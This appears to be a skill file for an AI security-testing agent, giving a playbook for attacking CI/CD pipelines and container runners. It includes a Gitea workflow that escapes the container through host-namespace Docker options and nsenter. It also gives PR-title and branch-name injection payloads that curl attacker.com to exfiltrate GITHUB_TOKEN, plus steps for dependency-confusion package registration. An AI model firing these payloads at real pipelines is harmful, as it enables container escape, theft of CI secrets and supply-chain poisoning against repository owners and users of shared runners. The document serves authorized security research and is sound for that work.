---
name: devops-hunt
description: CI/CD injection, container escape, workflow injection, build poisoning. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing DEVOPS vulnerabilities.
---

# SKILL-DEVOPS-HUNT — CI/CD Pipeline & Container Security Hunt — HUNT
# Phase Coverage: 46
# Vuln Classes: CI/CD Pipeline Injection, Container Escape, Workflow Injection,
#               Runner Hardening Bypass, Dependency Confusion, Build Poisoning
# Purpose: Active hunting for CI/CD and container security vulnerabilities

---

## SUB-PHASE 46.2: HUNT

### PATTERN 1: Container Options Injection (Runner Hardening Bypass)

```
SOURCE: raw/exploitarium/gitea-act-runner-container-options-poc
PATTERN: Workflow-controlled container.options is appended to Docker options.
         When privileged mode is disabled, only --privileged is forced false,
         but host namespace flags (--pid=host, --ipc=host), capability expansion
         (--cap-add=ALL), and security profile overrides pass through.

DISCOVERY:
  1. Identify runner type (Docker-backed act_runner, GitHub Actions runner)
  2. Check if runner enforces privileged=false in config
  3. Test if container.options accepts Docker CLI flags
  4. Verify which flags survive sanitization (only binds/mounts stripped)

HUNT:
  Step 1 - Create test workflow with container options:
    cat > .gitea/workflows/test.yml << 'EOF'
    name: Container Options Test
    on: [push]
    jobs:
      test:
        runs-on: ubuntu-latest
        container:
          image: ubuntu:22.04
          options: --pid=host --ipc=host --cap-add=ALL --security-opt seccomp=unconfined --security-opt apparmor=unconfined
        steps:
          - run: |
              apt-get update && apt-get install -y nsenter
              nsenter --target 1 --mount --pid -- hostname
              nsenter --target 1 --mount --pid -- sh -c 'echo "HOST_ACCESS" > /tmp/container_escape_marker'
    EOF

  Step 2 - Push and trigger workflow, observe execution

  Step 3 - Check if host marker was created (proves host namespace access)

ANALYSIS - CONFIRM IF REAL:
  - container.options passed to Docker without sanitization?
  - Host namespaces accessible? (--pid=host, --ipc=host work)
  - Privileged shows as false but host access achieved?
  - Capabilities expanded? (--cap-add=ALL honored)
  - Security profiles disabled? (seccomp=unconfined, apparmor=unconfined)
  - Docker socket inaccessible? (--container-daemon-socket=- proves nsenter path)

FALSE POSITIVE CHECK:
  - Runner rejects container.options = validation in place -> MITIGATED
  - Options stripped/sanitized = proper filtering -> MITIGATED
  - Container fails to start = Docker rejects flags -> NOT VULNERABLE (kernel/daemon config)
  - nsenter fails = no host namespace access -> NOT VULNERABLE
  - Container runs but privileged=true = already known -> different bug

CHAIN OUTPUT:
  - Container escape -> host root access (CRITICAL)
  - Host access + shared runner = cross-repository secret theft (CRITICAL)
  - Host access + deployment credentials = production infrastructure compromise
```

### PATTERN 2: Workflow Injection via Untrusted Input

```
DISCOVERY:
  1. Find workflow triggers on: pull_request, issue_comment, workflow_dispatch
  2. Check if PR branch name, PR title, PR body, or commit message is interpolated into scripts
  3. Check if artifact names, cache keys, or environment variables use attacker-controlled values

HUNT:
  Step 1 - Check for script injection in workflow:
    # Look for patterns like:
    # run: echo "${{ github.event.pull_request.title }}"
    # run: git checkout ${{ github.head_ref }}
    # These interpolate attacker-controlled values directly into shell

  Step 2 - Test injection via PR title:
    Create PR with title: '"; curl attacker.com/exfil?token=$GITHUB_TOKEN; #"
    Observe if the command executes in the workflow run

  Step 3 - Test injection via branch name:
    Create branch named: '"; id; curl http://attacker.com/$(whoami); #'
    Push and observe workflow output
```

### PATTERN 3: Dependency Confusion in CI

```
SOURCE: SKILL-RECON-HUNT.md Phase 37 HUNT
HUNT:
  Step 1 - Check package.json / requirements.txt / Gemfile for internal package names
  Step 2 - Check if CI installs from public registry before private registry
  Step 3 - Register same-named package in public registry
  Step 4 - Push workflow trigger, observe if public package is installed
```

---

*SKILL-DEVOPS-HUNT — Part of the acy Agentic Security Research System v3.0*
